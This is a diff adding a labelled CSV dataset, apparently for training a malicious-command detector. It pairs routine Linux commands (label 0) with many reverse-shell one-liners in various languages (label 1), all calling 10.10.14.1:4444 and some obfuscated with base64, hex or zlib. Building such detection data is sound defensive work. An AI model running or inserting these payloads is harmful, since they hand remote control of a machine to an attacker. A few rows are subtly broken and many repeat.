@@ -1,0 +1,301 @@
+"command","label"
+"cd /var/log",0
+"pwd",0
+"ls -la",0
+"cp file.txt /backup",0
+"mv oldname.txt newname.txt",0
+"rm -rf directory",0
+"touch newfile.txt",0
+"mkdir -p /path/to/newdir",0
+"cat logfile.txt",0
+"less largefile.txt",0
+"head -n 5 access.log",0
+"tail -n 10 error.log",0
+"uname -a",0
+"top",0
+"df -h",0
+"free -m",0
+"chmod 755 script.sh",0
+"chown user:group file.txt",0
+"apt update",0
+"apt install nginx",0
+"yum update",0
+"dnf install python3",0
+"ping -c 4 google.com",0
+"ifconfig",0
+"netstat -tulpn",0
+"whoami",0
+"id",0
+"adduser newuser",0
+"ps aux",0
+"kill -9 1234",0
+"htop",0
+"vim file.txt",0
+"nano config.conf",0
+"cd ~",0
+"ls -R",0
+"cp -r dir1 dir2",0
+"mv dir1 /archive",0
+"rm file.txt",0
+"cat file1.txt file2.txt",0
+"less -N logfile.txt",0
+"head access.log",0
+"tail -f error.log",0
+"uname -r",0
+"df /",0
+"free -h",0
+"chmod +x script.sh",0
+"chown -R user:group /data",0
+"apt upgrade",0
+"yum install httpd",0
+"dnf update",0
+"ping 8.8.8.8",0
+"ifconfig eth0",0
+"netstat -an",0
+"whoami",0
+"id newuser",0
+"adduser --home /home/testuser testuser",0
+"ps -ef",0
+"kill 1234",0
+"htop -u user",0
+"vim +10 file.txt",0
+"nano -l config.conf",0
+"cd ..",0
+"ls -lh",0
+"cp file.txt file.bak",0
+"mv file.txt /tmp",0
+"rm -i file.txt",0
+"cat -n script.sh",0
+"less +G logfile.txt",0
+"head -n 20 access.log",0
+"tail -n +2 error.log",0
+"cd -",0
+"ls -t",0
+"pwd -P",0
+"cp -p file.txt /backup",0
+"mv -i file.txt /tmp",0
+"rm -r dir1",0
+"touch -t 202505211200 file.txt",0
+"mkdir newdir",0
+"cat > newfile.txt",0
+"less +F logfile.txt",0
+"head -c 100 file.txt",0
+"tail -n 5 access.log",0
+"uname -m",0
+"top -n 1",0
+"df -T",0
+"free -t",0
+"chmod 644 file.txt",0
+"chown -h user symlink",0
+"apt autoremove",0
+"apt purge nginx",0
+"yum remove httpd",0
+"dnf upgrade",0
+"ping -i 0.5 google.com",0
+"ifconfig eth0 up",0
+"netstat -i",0
+"who",0
+"passwd newuser",0
+"userdel -r testuser",0
+"ps -C nginx",0
+"killall nginx",0
+"htop -d 5",0
+"vim -R file.txt",0
+"nano -c config.conf",0
+"cd /etc",0
+"ls -1",0
+"cp -u file.txt /backup",0
+"mv -n file.txt /tmp",0
+"rm -v file.txt",0
+"cat << EOF > script.sh",0
+"less -i logfile.txt",0
+"head -n -5 access.log",0
+"tail -q -n 3 file1.txt file2.txt",0
+"uname -n",0
+"df -i",0
+"chmod -R 750 /data",0
+"chown :group file.txt",0
+"apt clean",0
+"yum check-update",0
+"dnf autoremove",0
+"ping -c 2 192.168.1.1",0
+"ifconfig eth0 down",0
+"netstat -r",0
+"w",0
+"usermod -aG sudo newuser",0
+"groupadd newgroup",0
+"ps -u user",0
+"pkill -u user",0
+"htop -t",0
+"vim -c 'set number' file.txt",0
+"nano -w config.conf",0
+"cd /usr/local/bin",0
+"ls -S",0
+"cp -v file.txt /backup",0
+"mv -u dir1 /archive",0
+"touch -a file.txt",0
+"cat -s file.txt",0
+"less -M logfile.txt",0
+"head -q -n 2 file1.txt file2.txt",0
+"tail -v -n 2 error.log",0
+"free -s 2",0
+"chmod u+x script.sh",0
+"chown -R user:group /var/www",0
+"apt list --installed",0
+"yum history",0
+"dnf provides /bin/bash",0
+"ping -s 100 google.com",0
+"netstat -s",0
+"last",0
+"ps -p 1234",0
+"vim -b file.bin",0
+"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",1
+"nc -e /bin/sh 10.10.14.1 4444",1
+"perl -e 'use Socket;$i=""10.10.14.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",1
+"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f",1
+"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(""10.10.14.1"",4444);loop{c.gets.chomp!;(exit! if $_==""exit"");($_=~//)?c.puts(`$_`):c.puts("""");}'",1
+"nc -u 10.10.14.1 4444 -e /bin/bash",1
+"php -r '$sock=fsockopen(""10.10.14.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+"0<&196;exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196",1
+"python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024).decode();p=subprocess.Popen(d,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE);s.send(p.stdout.read()+p.stderr.read())'",1
+"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,""10.10.14.1:4444"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);loop{c.gets.chomp!;($_==""exit"")?exit:c.puts(`$_`)}'",1
+"rm /tmp/p; mkfifo /tmp/p; nc 10.10.14.1 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);$p=popen(""/bin/sh -i"",""r"");while(!feof($p)){$l=fgets($p);fwrite($s,$l);};'",1
+"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'",1
+"bash -i >& /dev/udp/10.10.14.1/4444 0>&1",1
+"perl -e 'use Socket;$i=""10.10.14.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
+"nc 10.10.14.1 4444 -e /bin/bash",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'",1
+"php -r '$sock=fsockopen(""10.10.14.1"",4444);$proc=proc_open(""/bin/sh -i"",[0=>""pipe"",""r"",1=>""pipe"",""w"",2=>""pipe"",""w""],$pipes);while(true){fwrite($pipes[0],fread($sock,1024));fwrite($sock,fread($pipes[1],1024));fwrite($sock,fread($pipes[2],1024));}'",1
+"bash -c 'sh -i >& /dev/tcp/10.10.14.1/4444 0>&1'",1
+"python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True: d=s.recv(1024).decode();p=os.popen(d);s.send(p.read().encode())'",1
+"nc -u 10.10.14.1 4444 -e /bin/sh",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",1
+"bash -c 'exec 3<>/dev/tcp/10.10.14.1/4444;while read line <&3;do $line >&3 2>&3;done'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);loop{c.gets.chomp!;($_==""exit"")?exit:c.puts(`$_`)}'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){system($c,$o);fwrite($s,$o);}'",1
+"python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024).decode();p=subprocess.run(d,shell=True,capture_output=True);s.send(p.stdout+p.stderr)'",1
+"nc 10.10.14.1 4444 -e /bin/sh",1
+"bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'",1
+"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,""10.10.14.1:4444"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);loop{c.gets.chomp!;($_==""exit"")?exit:c.puts(`$_`)}'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec($c,$o);foreach($o as $l){fwrite($s,$l.""\n"");}}'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do $line >&5 2>&5;done'",1
+"python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")'",1
+"nc -u 10.10.14.1 4444 -e /bin/bash",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec($c,$o);foreach($o as $l){fwrite($s,$l.""\n"");}}'",1
+"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
+"package main;import(""net"";""os/exec"";""bufio"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{r:=bufio.NewReader(c);cmd,_:=r.ReadString('\n');out,_:=exec.Command(""bash"",""-c"",cmd).Output();c.Write(out)}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('connect',s=>s.pipe(require('child_process').spawn('/bin/sh').stdin).pipe(s))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do $line >&3 2>&3;done'",1
+"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(bin2hex($c),$o);foreach($o as $l){fwrite($s,hex2bin($l));}}'",1
+"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
+"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024).decode();c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
+"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'",1
+"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
+"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(o)))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(bin2hex($c),$o);foreach($o as $l){fwrite($s,hex2bin($l));}}'",1
+"nc 10.10.14.1 4444 -e /bin/bash | base64 | nc 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
+"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
+"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""udp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'",1
+"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
+"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""udp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
+"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;import java.util.zip.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
+"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
+"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'",1
+"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
+"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
+"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
+"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
